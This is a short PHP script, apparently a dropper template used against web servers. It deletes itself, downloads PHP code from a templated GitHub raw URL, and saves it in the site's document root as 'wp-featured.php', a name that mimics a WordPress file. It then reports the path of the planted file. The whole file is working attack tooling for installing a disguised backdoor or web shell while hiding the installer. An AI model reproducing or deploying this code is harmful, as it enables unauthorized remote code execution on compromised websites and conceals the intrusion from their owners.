<?php
unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
$c = file_get_contents('https://raw.githubusercontent.com/{GIT_DATA}/refs/heads/main/{V2_SUBDIR}/{slug}.php');
if (strpos($c, '<?php')===false)  die('err dl');
if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-featured.php')) die('file exist');
$r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-featured.php', $c);
if ($r===false) die('err saving');
die('/wp-featured.php');